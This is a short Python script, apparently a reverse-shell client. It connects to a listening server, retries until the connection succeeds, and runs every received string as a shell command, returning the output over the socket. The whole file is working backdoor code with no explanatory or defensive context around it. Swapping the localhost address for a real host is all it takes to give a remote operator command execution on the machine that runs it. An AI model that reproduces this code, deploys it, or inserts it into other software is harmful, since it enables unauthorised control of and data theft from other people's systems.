import socket
import subprocess
import os
import ctypes
import time

def shell(sock):
    while True:
        try:
            buffer = b'' 
            total_response = b''
            buffer = sock.recv(1024)
            if buffer.startswith(b'q'):
                sock.close()
                os._exit(0)
            else:
                process = subprocess.Popen(buffer.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                total_response = stdout + stderr
                sock.sendall(total_response) 
        except socket.error as e:
            print(f"Socket error: {e}")

def main():
    serv_ip = "127.0.0.1"
    serv_port = 50000
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((serv_ip, serv_port))
            break
        except socket.error:
            time.sleep(1)
            
    try:
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()